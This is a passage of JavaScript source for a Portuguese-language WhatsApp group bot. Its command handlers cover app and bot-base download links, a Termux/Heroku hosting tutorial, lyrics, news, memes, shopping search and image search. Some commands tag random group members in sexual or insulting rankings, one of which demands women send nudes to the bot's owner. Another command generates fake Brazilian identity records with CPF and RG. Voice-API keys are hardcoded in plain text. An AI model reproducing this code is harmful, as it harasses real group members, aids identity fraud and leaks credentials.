{title: "✨҉̶⃟➜ 𝐂𝐋𝐎𝐕𝐄𝐑 𝐃𝐄𝐒𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/oersab3akdabkcy/%25F0%259D%2590%2582%25F0%259D%2590%258B%25F0%259D%2590%258E%25F0%259D%2590%2595%25F0%259D%2590%2584%25F0%259D%2590%2591_%25F0%259D%2590%2583%25F0%259D%2590%2584%25F0%259D%2590%2592%25F0%259D%2590%2582%25F0%259D%2590%2591.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},

{title: "✨҉̶⃟➜ 𝐕𝐄𝐍𝐎𝐌 𝐂𝐎𝐍𝐒𝐎𝐋𝐄 𝐕𝟐 𝐃𝐄𝐒𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/l1qk7s8ijmqg3qz/%25F0%259D%2590%2595%25F0%259D%2590%2584%25F0%259D%2590%258D%25F0%259D%2590%258E%25F0%259D%2590%258C_%25F0%259D%2590%2582%25F0%259D%2590%258E%25F0%259D%2590%258D%25F0%259D%2590%2592%25F0%259D%2590%258E%25F0%259D%2590%258B%25F0%259D%2590%2584_%25F0%259D%2590%25952_%25F0%259D%2590%2583%25F0%259D%2590%2584%25F0%259D%2590%2592%25F0%259D%2590%2582.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐕𝐄𝐍𝐎𝐌 𝐁𝐀𝐒𝐄 𝐃𝐄𝐒𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/0on30ejpwvvkohl/%25F0%259D%2590%2595%25F0%259D%2590%2584%25F0%259D%2590%258D%25F0%259D%2590%258E%25F0%259D%2590%258C_%25F0%259D%2590%2581%25F0%259D%2590%2580%25F0%259D%2590%2592%25F0%259D%2590%2584_%25F0%259D%2590%2583%25F0%259D%2590%2584%25F0%259D%2590%2592%25F0%259D%2590%2582%25F0%259D%2590%2591.zip/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐒𝐎𝐏𝐇𝐘 𝐃𝐄𝐒𝐂𝐑𝐈𝐏", rowId: `${prefix}mediafire https://www.mediafire.com/file/hzigqo8rdlcch2p/%25F0%259D%2590%2592%25F0%259D%2590%258E%25F0%259D%2590%258F%25F0%259D%2590%2587%25F0%259D%2590%2598_%25F0%259D%2590%2583%25F0%259D%2590%2584%25F0%259D%2590%2592%25F0%259D%2590%2582%25F0%259D%2590%2591.zip/file
`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐀𝐂𝐎𝐃𝐄", rowId: `${prefix}mediafire https://www.mediafire.com/file/h0osdxk3k458t5w/%25F0%259D%2590%2580%25F0%259D%2590%2582%25F0%259D%2590%258E%25F0%259D%2590%2583%25F0%259D%2590%2584.apk/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐓𝐄𝐑𝐌𝐔𝐗 𝟏.𝟏𝟏𝟗.𝟏", rowId: `${prefix}mediafire https://www.mediafire.com/file/gfjxfd2pl1v7l2n/%25F0%259D%2590%2593%25F0%259D%2590%2584%25F0%259D%2590%2591%25F0%259D%2590%258C%25F0%259D%2590%2594%25F0%259D%2590%2597_1.119.1..apk/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐓𝐄𝐌𝐏 𝐌𝐀𝐈𝐋", rowId: `${prefix}mediafire https://www.mediafire.com/file/ew4lzgpqc8doy71/Temp_Mail_v3.10_%255BAdfree%255D.apk/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐇𝐌𝐀𝐍𝐀𝐆𝐄𝐑", rowId: `${prefix}mediafire https://www.mediafire.com/file/7raouyyq9lm1ekl/HManager.apk/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐄𝐗 𝐅𝐈𝐋𝐄 𝐄𝐗𝐏𝐋𝐎𝐑𝐄", rowId: `${prefix}mediafire https://www.mediafire.com/file/z414ksjtoiha5ey/Es_File_Explore_Premium.apk/file`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "✨҉̶⃟➜ 𝐓𝐔𝐓𝐎𝐑𝐈𝐀𝐋", rowId: `${prefix}tutorial-termux`, description: "◈ 机⃝𐰷𑁈ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝚩𝚹𝚻⃝🌸̶ >3"},
]
},
]
sendlistA(from, `
┏⧐┅┅┅⃟🌺┅┅⧏ ❀ ⧐┅┅🌺⃟┅┅┅⧏┓
┃      ⟦✨⟧𝐁𝐀𝐒𝐄𝐒 𝐃𝐄 𝐁𝐎𝐓⟦💫⟧      ┃
┗⧐┅┅┅⃟🌺┅┅⧏ ❀ ⧐┅┅🌺⃟┅┅┅⧏┛`, "", "", "⟦🤩⟧𝐇𝐔𝐌 𝐇𝐔𝐌, 𝐂𝐋𝐈𝐂𝐀⟦🤩⟧", botaoale)
break

case "tutorial-termux":
reply(`
🇱 🇪 🇮 🇦  🇹 🇺 🇩 🇴 

BOA SORTE<3  
TERMUX = ()
HEROKU = []

Esse primeiro comando geralmente aparece algo vermelho escrito "ERRO", isso é normal, não se preocupe,mas se caso, em qualquer comando aparecer algo escrito "FAILED" isso quer dizer que deu erro mesmo, ai só fazendo tuuudo de novo ok! Boa sorte!

(1° COMANDO) Esse comando é usado apenas uma vez no termux, só se vc desinstalar ou limpar os dados do Termux, ai você terá que usar ele novamente.

pkg upgrade -y && pkg update -y && pkg install python -y && pkg install nodejs-lts -y && pkg install nodejs -y && pkg install git -y && pkg install ffmpeg -y && pkg install wget -y

[1° COMANDO DE HOSPEDAGEM] Usado para fazer o termux ser compatível com o heroku para hospedagem.

npm i -g npm@6 && npm i heroku -g

(2° COMANDO) Usado para dar permissão ao termux acessar a memória interna do celular.

termux-setup-storage

(3° COMANDO) (PASTA DO BOT) = Nome da pasta aonde está o seu bot. Exemplo; cd /sdcard/ESDEATHBOT ou cd /sdcard/download/ESDEATHBOT.
Pode ocorrer que quando você extrair o arquivo, pode ser que ele esteja em mais de uma pasta, ai você terá que tirar ele de lá ou dar o comando do exemplo; cd /sdcard/ESDEATHBOT/ESDEATHBOT ou cd /sdcard/download/ESDEATHBOT/ESDEATHBOT

cd /sdcard/(pasta do bot)

(4° COMANDO) Aqui é o ultimo comando que é a chave de ligar o bot. Dependendo do bot, pode ser que a chave seja o nome do bot;

sh start.sh      <----|Essa é a geral, todos usam|<
sh sheyot.sh
sh nezuko.sh
sh tatsumaki.sh
sh evolution.sh
sh sabrina.sh
sh venom.sh

FIM.....^-^

2° Criar conta no heroku
ACESSE O LINK; https://signup.heroku.com/login

Logo em seguida, coloque um nome e um sobre nome;
depois um email;{vc pode usar o app "Temp Mail" para gerar email}
Company name deixe branco;
Roly selecione o "Hobbyist";
Contry/Região coloque o seu país;
Linguage coloque "NodeJs"
Verifique se vc é humano, depois confirme no botão.
Vá para o "Temp Mail" e confirme o Email;
crie uma senha;
E selecione as caixinhas que vão aparecer como confirmação de que você leu os termos;
E pronto, vá para o termux dar os seguintes comandos

[3° Para Hospedar o bot] esse comando só funciona, se você tiver um arquivo com esse nome abaixo.

sh hospedar.sh

depois é só dar enter, logar a conta do heroku e voltar para o termux, em seguida você digitará o nome exato da pasta do bot, e dé enter, e logo em seguida você irá criar o nome do app do bot, sugiro usar um nome que só você imagina colocar,e tem que ser minúsculo, mais um número ex; kokushibu16 Depois é só dar enter, se der erro cole esse comando lá no termux;

git config --global --add safe.directory/storage/emulated/0/PASTA DO bot

ou 

git config --global --add safe.directory/storage/emulated/0/download/PASTA DO BOT

Se caso você repetir o mesmo processo e der erro na hora de criar um nome pro app do heroku, vá para o heroku e apague os APPs que você criou antes, pois o heroku tem limite de app. Tente novamente sempre com um nome diferente.

se você não consegue usar o heroku por ele ser pago, fale com esses dois desenvolvedores de bot, eles alugam uma VPS muito boa pra você usar.
by Lotus; wa.me/5521995400244
by Daniel; wa.me/5521964523665

❏ Personalizado por 𝑻𝚯𝛭𝑰𝚯𝜥𝛥 𝑵𝜩𝑻
`)
break

//========FIM=============\\

case 'dadosfake':
if(!isPremium) return reply(mess.premium)
                    send = await fetchJson(`https://api.brizaloka-api.tk/gerador/pessoa?apikey=brizaloka`)
                    teks = `✔️ DADOS GERADO

Nome: ${send.resultado.nome}
Mãe: ${send.resultado.mae}
Pai: ${send.resultado.pai}
Rg: ${send.resultado.RG}
Cpf: ${send.resultado.CPF}
Telefone: ${send.resultado.telefonde}
Signo: ${send.resultado.signo}
Altura: ${send.resultado.altura}
Peso: ${send.resultado.peso}
Tipo Sanguíneo: ${send.resultado.tipoSanguineo}
Cep: ${send.resultado.endereco.cep}
Lagradouro: ${send.resultado.endereco.logradouro}
Complemento: ${send.resultado.endereco.complemento}
Número: ${send.resultado.endereco.numero}
Bairro: ${send.resultado.endereco.bairro}
Cidade: ${send.resultado.endereco.cidade}
Estado: ${send.resultado.endereco.estado}
Sigla do estado: ${send.resultado.endereco.estadoSigla}`
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
                    break

case 'rankgostosos':
case 'rankgostoso':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

member = []
const p01 = groupMembers
const p02 = groupMembers
const p03 = groupMembers
const p04 = groupMembers
const p05 = groupMembers
const o01 = p01[Math.floor(Math.random() * p01.length)]
const o02 = p02[Math.floor(Math.random() * p02.length)]
const o03 = p03[Math.floor(Math.random() * p03.length)]
const o04 = p04[Math.floor(Math.random() * p04.length)]
const o05 = p05[Math.floor(Math.random() * p05.length)]
luy = `
Parados!🤚🤚\n\n1=🤚🤭@${o01.id.split('@')[0]}🤚🤭\n\n\n2=🤚🤭@${o02.id.split('@')[0]}🤚🤭\n\n\n3=🤚🤭@${o03.id.split('@')[0]}🤚🤭\n\n\n4=🤚🤭@${o04.id.split('@')[0]}🤚🤭\n\n\n5=🤚🤭@${o05.id.split('@')[0]}🤚🤭\n\n\nMulta por serem gostosos dms😳 pague pena trabalhando em nossa agência de modelos 😊 by: 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`
member.push(o01.id)
member.push(o02.id)
member.push(o03.id)
member.push(o04.id)
member.push(o05.id)
mentions(luy, member, true)
break

case 'caracoroa':
// by Nezuko-MD 
const cara = fs.readFileSync('./base de dados/database/figurinhas/cara.webp');
const coroa = fs.readFileSync('./base de dados/database/figurinhas/coroa.webp');
cararo = ["cara", "coroa"]
fej = cararo[Math.floor(Math.random() * cararo.length)]
reply(`você conseguiu: ${fej}`);
nezuko.sendMessage(from, {sticker: fs.readFileSync('./base de dados/database/figurinhas/'+fej+'.webp')}, {quoted: dnselo});
break

case 'carta':
var txt = body.slice(6)
var txtt = args.join(" ")
var txt1 = txt.split("/")[0];
var txt2 = txtt.split("/")[1];
if(!txt) return reply('Cade o número da pessoa?')
if(!txtt) return reply('Cade a mensagem do correio??')
if(txt.includes("@")) return reply('So o número sem @ pfvr')
if(txt.includes("-")) return reply('Tem que ser o número junto sem +, e não pode tá separado da /')
if(txtt.includes("+")) return reply('Tem que ser o número junto sem +, e não pode tá separado da /')
if(!txtt.includes("/")) return reply(`Exemplo: ${prefix}correio 558198923680/Eae cade o pix de 50 que tu ta me devendo?`)
reply('Se você fez tudo certo, logo será entregue!, não pego número fake! ')
var bla = 
`╭────────────────⪨
│      💌 𝓒𝓪𝓻𝓽𝓪 💌
├────────────────
│👤Carta do ${pushname}
│📞Renviar: ${sender.split('@')[0]}
│🔗Link: wa.me/${sender.split('@')[0]} 
╰────────────────⪨
${txt2} `
nezuko.sendMessage(`${txt1}@s.whatsapp.net`, {text: bla})
break

case 'rankgostosas':
case 'rankgostosa':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

member = []
const p1 = groupMembers
const p2 = groupMembers
const p3 = groupMembers
const p4 = groupMembers
const p5 = groupMembers
const o1 = p1[Math.floor(Math.random() * p1.length)]
const o2 = p2[Math.floor(Math.random() * p2.length)]
const o3 = p3[Math.floor(Math.random() * p3.length)]
const o4 = p4[Math.floor(Math.random() * p4.length)]
const o5 = p5[Math.floor(Math.random() * p5.length)]
luy = `
Paradas!🤚🤚\n\n1=🤚🤭@${o1.id.split('@')[0]}🤚🤭\n\n\n2=🤚🤭@${o2.id.split('@')[0]}🤚🤭\n\n\n3=🤚🤭@${o3.id.split('@')[0]}🤚🤭\n\n\n4=🤚🤭@${o4.id.split('@')[0]}🤚🤭\n\n\n5=🤚🤭@${o5.id.split('@')[0]}🤚🤭\n\n\nMultas por serem gostosas dms😳 pague pena enviando nud no PV do dono😊 by Bot`
member.push(o1.id)
member.push(o2.id)
member.push(o3.id)
member.push(o4.id)
member.push(o5.id)
mentions(luy, member, true)
break

case 'ranknazista':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

try{
if(!isGroup) return reply(enviar.msg.grupo)
d = []
teks = '💂‍♂️Rank dos mais nazistas do gp\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `💂‍♂️❧ @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rankotakus':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

membr = []
const otaku1 = groupMembers
const otaku2 = groupMembers
const otaku3 = groupMembers
const otaku4 = groupMembers
const otaku5 = groupMembers
const otaku6 = groupMembers
const otaku7 = groupMembers
const otaku = groupMembers
const otaku9 = groupMembers
const otaku10 = groupMembers
const otakus1 = otaku1[Math.floor(Math.random() * otaku1.length)]
const otakus2 = otaku2[Math.floor(Math.random() * otaku2.length)]
const otakus3 = otaku3[Math.floor(Math.random() * otaku3.length)]
const otakus4 = otaku4[Math.floor(Math.random() * otaku4.length)]
const otakus5 = otaku5[Math.floor(Math.random() * otaku5.length)]
const otakus6 = otaku6[Math.floor(Math.random() * otaku6.length)]
const otakus7 = otaku7[Math.floor(Math.random() * otaku7.length)]
const otakus = otaku[Math.floor(Math.random() * otaku.length)]
const otakus9 = otaku9[Math.floor(Math.random() * otaku9.length)]
const otakus10 = otaku10[Math.floor(Math.random() * otaku10.length)]
ytb = `esses são os otakus fedidos do grupo\n@${otakus1.id.split('@')[0]}\n@${otakus2.id.split('@')[0]}\n@${otakus3.id.split('@')[0]}\n@${otakus4.id.split('@')[0]}\n@${otakus5.id.split('@')[0]}\n@${otakus6.id.split('@')[0]}\n@${otakus7.id.split('@')[0]}\n@${otakus.id.split('@')[0]}\n@${otakus9.id.split('@')[0]}\n@${otakus10.id.split('@')[0]}\n\n⚡ 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿 ⚡`
membr.push(otakus1.id)
membr.push(otakus2.id)
membr.push(otakus3.id)
membr.push(otakus4.id)
membr.push(otakus5.id)
membr.push(otakus6.id)
membr.push(otakus7.id)
membr.push(otakus.id)
membr.push(otakus9.id)
membr.push(otakus10.id)
mentions(ytb, membr, true)
break

case 'rankpau':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

membr = []
const pauz1 = groupMembers
const pauz2 = groupMembers
const pauz3 = groupMembers
const pauz4 = groupMembers
const pauz5 = groupMembers
const paus1 = pauz1[Math.floor(Math.random() * pauz1.length)]
const paus2 = pauz2[Math.floor(Math.random() * pauz2.length)]
const paus3 = pauz3[Math.floor(Math.random() * pauz3.length)]
const paus4 = pauz4[Math.floor(Math.random() * pauz4.length)]
const paus5 = pauz5[Math.floor(Math.random() * pauz5.length)]
var pcpau1 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau2 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau3 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau4 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau5 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
const pc1 = pcpau1[Math.floor(Math.random() * pcpau1.length)]
const pc2 = pcpau2[Math.floor(Math.random() * pcpau2.length)]
const pc3 = pcpau3[Math.floor(Math.random() * pcpau3.length)]
const pc4 = pcpau4[Math.floor(Math.random() * pcpau4.length)]
const pc5 = pcpau5[Math.floor(Math.random() * pcpau5.length)]
pdr = `Esses são os caras com o menor e maior pau do Grupo\n${groupName}\n\n@${paus1.id.split('@')[0]}\n${pc1}\n@${paus2.id.split('@')[0]}\n${pc2}\n@${paus3.id.split('@')[0]}\n${pc3}\n@${paus4.id.split('@')[0]}\n${pc4}\n@${paus5.id.split('@')[0]}\n${pc5}\n\n ${NomeDoBot}`
membr.push(paus1.id)
membr.push(paus2.id)
membr.push(paus3.id)
membr.push(paus4.id)
membr.push(paus5.id)
mentions(pdr, membr, true)
break 

//========FINAL DOS JOGOS=============

//========VOZES=============
case 'lyrics':
if (args.length < 1) return reply('Qual é o nome da música?')
teks = body.slice(7)
res = await lirikLagu(teks)
reply(`
┏━━━━━━[👥]━━━━━━━━
⚙️ *música: ➤ ${teks}*
⚙️ *Letra:* ☟︎︎︎
┗━━━━━━[👥]━━━━━━━━

*${res[0].result}*`)
 break
 
case 'ptlyrics':
try {
reply(mess.wait)
teks = body.slice(10)
anu = await fetchJson(`https://api.brizaloka-api.tk/ia/lyricsfinder?apikey=17desetembro&query=${teks}`, {method: 'get'})
dated = `*Nome da música: ${teks}*\n*Letras:*\n*${anu.lyrics}*`
} catch (e) {
    console.log(e)
    reply(`erro!!`)
}
break
       case 'ibere':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'ibere', teks).then(async res => {
    buff = await getBuffer(res)
    nezuko.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: dnselo})
})
break

            case 'eminem':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'eminem', teks).then(async res => {
    buff = await getBuffer(res)
    nezuko.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: dnselo})
})
break
            case 'chapolin':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'chapolin-br', teks).then(async res => {
    buff = await getBuffer(res)
    nezuko.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: dnselo})
})
break

case 'patolino':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'patolino', teks).then(async res => {
    buff = await getBuffer(res)
    nezuko.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: m })
})
break
            case 'faustao':
if(args.length < 1) return reply('Escreva o texto de deseje que fale')
teks = body.slice(7)
uber.getAudioUrl('pub_mgqgxwvhxsukcqqawy', 'pk_d4cdd6d0-5ab7-4067-b9e2-8cdfdae6ec9f', 'faustao', teks).then(async res => {
    buff = await getBuffer(res)
    nezuko.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, { quoted: dnselo})
})
break
//========FINAL VOZES=============



//========LOGOS/+18=============

			case 'mulheres': case 'pesquisar-mulheres':
reply(mess.wait)
var query = ["cecan hd","cecan indo","cewe cantik", "cewe aesthetic", "cecan aesthetic"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${prefix}${command}`, buttonText: { displayText: "<❗> PRÓXIMO <❗> " }, type: 1 }]
nezuko.sendMessage(from, { caption: "AQUI ESTÁ!!!", image: { url: pickRandom(data.result) }, buttons: but, footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO' }, { quoted: dnselo})
 break
			case 'foto-cria': case 'foto-de-cria':
		reply(mess.wait)
var query = ["foto de cria","cria rj","foto de cria perfil","cria do rj","'foto-cria","'foto cria","'foto-de-cria","foto de cria"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${prefix}${command}`, buttonText: { displayText: "<❗> PRÓXIMO <❗> " }, type: 1 }]
nezuko.sendMessage(from, { caption: "AQUI ESTÁ!!", image: { url: pickRandom(data.result) }, buttons: but, footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO' }, { quoted: dnselo})
break

case 'pesquisar':
try {
reply(enviar.espere)
blar = Math.floor(Math.random() * 5)
bla = await fetchJson(`http://aleatory-api.xyz:8080/api/gimage?txt=${q}&apikey=key-do_jose-carlos-2.5-`)
blabla = await getBuffer(bla.resultado.result[`${blar}`].url) 
nezuko.sendMessage(from, {image: blabla}, {quoted: dnselo}).catch(e => {
reply("ERROR, não foi encontrado, tente novamente...")
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'noticias':
var { TodaNoticias } = require('./armor/scraper')
await TodaNoticias().then(async (res) => {
await reply(res.resultado.map(a => `📍 *Noticia*: ${a.noticia}\n📰 *Descrição*: ${a.desc || 'Não tem'}\n🔗 *Link*: ${a.link}`).join('\n\n•••••••••••••••••••••••••••••\n\n'))
}).catch(async (e) => {
console.log(e)
reply('ERROR')
})
break

case 'amazon':
var { AmazonSearch } = require('./armor/scraper')
if(!q) return reply(`O que você está procurando?`)
AmazonSearch(q).then(async ({resultado: res}) => {
  await nezuko.sendMessage(from, {image: {url: res[0].imagem}, caption: res.map(a => `🛍️ *Produto*: ${a.produto}\n💸 *Preço*: ${a.valor}\n🔗 *Link*: ${a.link}`).join('\n\n••••••••••••••••••••••••\n\n')}, {quoted: dnselo})
}).catch((e) => {
console.log(e)
reply('ERROR')
})
break

case 'submarino':
var { SubmarinoSearch } = require('./armor/scraper')
if(!q) return reply(`O que você está procurando?`)
SubmarinoSearch(q).then(async ({resultado: res}) => {
  await nezuko.sendMessage(from, {image: {url: res[0].imagem}, caption: res.map(a => `🛍️ *Produto*: ${a.produto}\n💸 *Preço*: ${a.valor}\n🔗 *Link*: ${a.link}`).join('\n\n••••••••••••••••••••••••\n\n')}, {quoted: dnselo})
}).catch((e) => {
console.log(e)
reply('ERROR')
})
break

case 'americanas':
var { AmericanasSearch } = require('./armor/scraper')
if(!q) return reply(`O que você está procurando?`)
AmericanasSearch(q).then(async ({resultado: res}) => {
  await nezuko.sendMessage(from, {image: {url: res[0].imagem}, caption: res.map(a => `🛍️ *Produto*: ${a.produto}\n💸 *Preço*: ${a.valor}\n🔗 *Link*: ${a.link}`).join('\n\n••••••••••••••••••••••••\n\n')}, {quoted: dnselo})
}).catch((e) => {
console.log(e)
reply('ERROR')
})
break

case 'meme2':
var { memesDroid } = require('./armor/funcoes/scraper.js')
memesDroid().then(async (res) => {
if(res.resultado.length == 0) return await reply(`Não consegui encontrar tente novamente`)
teks = pickRandom(res.resultado)
await nezuko.sendMessage(from, {image: await getBuffer(teks.imagem), caption: teks.titulo, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: 'proximo ☔'}, type: 1}]}, {quoted: dnselo})
}).catch(async (e) => {
console.log(e)
await reply("ERROR")
})
break

case 'globo': case 'poder360': case 'jovempan': case 'uol': case 'cnnbrasil': case 'estadao':
try {
var Lrows = []
data = await fetchJson(`https://nezsab-apis.xyz/api/noticias/${command}?apikey=${keyapi}`)
for(let a of data.pesquisa.resultado) {
Lrows.push({title: `${a.noticia}`, description: `> Veja a matéria completa no site abaixo:\n${a.link}`, rowId: `UP`})
}
listMessage = {
text: `Confira agora algumas das notícias de hoje no ${command} na íntegra!!\n>> *Fonte:* ${data.pesquisa.fonte}`,
footer: ``,
title: ``,
buttonText: "🗞𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🗞️",
sections: [{
title: `${NomeDoBot}`, 
rows: Lrows
}
]
}
nezuko.sendMessage(from, listMessage)
}catch(err){
reply(`<❌️> Erro! Nenhuma atualização no site!`)
}
break

case 'playstore':
if(!q.length > 2) return reply("Cade o título do apk que deseja pesquisar?")
async function ytsrcbtt() {
var Lrows = []
data = await fetchJson(`https://nezsab-apis.xyz/api/playstore?nome=${q}&apikey=${keyapi}`)
for(let a of data.pesquisa.resultado) {
Lrows.push({title: `${a.nome}`, description: `Desenvolvedor do App: ${a.desenvolvedor}\nAvaliação do Aplicativo: ${a.estrelas}\nLink do Aplicativo: ${a.link}\nLink da Imagem: ${a.imagem}`, rowId: `a`})
}
listMessage = {
text: `> Buscando por: ${q}\nClique para ver as informações!`,
footer: `By: ${NomeDoBot}`,
title: `⸺͟͞ꪶ𝐏𝐄𝐒𝐐𝐔𝐈𝐒𝐀: 𝐏𝐋𝐀𝐘-𝐒𝐓𝐎𝐑𝐄ꫂ ✰✰`,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${NomeDoBot}`, 
rows: Lrows
}
]
}
nezuko.sendMessage(from, listMessage)
}
ytsrcbtt().catch(e => {
reply("<❌️> Não encontrei o aplicativo ou api caiu!")
})
break

case 'ifunny':
case 'meme3':
var { iFunny } = require('./armor/funcoes/scraper.js')
iFunny().then(async (res) => {
if(res.imagens.length == 0) return await reply(`Não consegui encontrar tente novamente`)
teks = pickRandom(res.imagens)
await nezuko.sendMessage(from, {image: await getBuffer(teks.imagem), caption: teks.titulo, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: 'proximo ☔'}, type: 1}]}, {quoted: dnselo})
}).catch(async (e) => {
console.log(e)
await reply("ERROR")
})
break

case 'memevid':
var { iFunny } = require('./armor/funcoes/scraper.js')
for(i=0; i<10; i++) {
res = await iFunny()
if(res.videos.length == 0) continue;
teks = pickRandom(res.videos)
await nezuko.sendMessage(from, {video: await getBuffer(teks.video), caption: teks.titulo, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: 'proximo ☔'}, type: 1}]}, {quoted: dnselo})
break; 
}
break

case 'sugestão':
case 'sugestao':
const sugestao = body.slice(10)
if (args.length <= 1) return reply(`Exemplo: ${prefix}sugestao "Opa, crie um comando tal, que ele funcione de tal maneira, isso será muito bom, não só pra mim, mas pra vários fazer isso..."`)
if (args.length >= 800) return nezuko.sendMessage(from, {text: 'Máximo 800 caracteres'}, {quoted: dnselo})
var nomor = info.participant
sug = `*[👥️] SUGESTÕES DE CMDS [👥]*\nEnviado por: wa.me/${sender.split("@s.whatsapp.net")[0]}\nMensagem: ${sugestao}`
await nezuko.sendMessage(`${numerodonoa}@s.whatsapp.net`, {text: sug}, {quoted: info})
reply("Mensagem enviada ao meu dono, obrigado pela sugestão, tentar ouvir o máximo possível de sugestões.")
break

case 'yaoi':
reply(mess.wait)
var query = ["yaoi","yaoi aesthetic","yaoi hd","yaoi ganteng"]
var data = await pinterest(pickRandom(query))
var but = [{buttonId: `${prefix}${command}`, buttonText: { displayText: "<❗> PRÓXIMO <❗> " }, type: 1 }]
nezuko.sendMessage(from, { caption: "AQUI ESTÁ!!! ", image: { url: pickRandom(data.result) }, buttons: but, footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO' }, { quoted: dnselo})
 break

case 'waifu':
 reply(mess.wait)
var query = ["waifu","waifu aesthetic","waifu hd"]
var data = await pinterest(pickRandom(query))
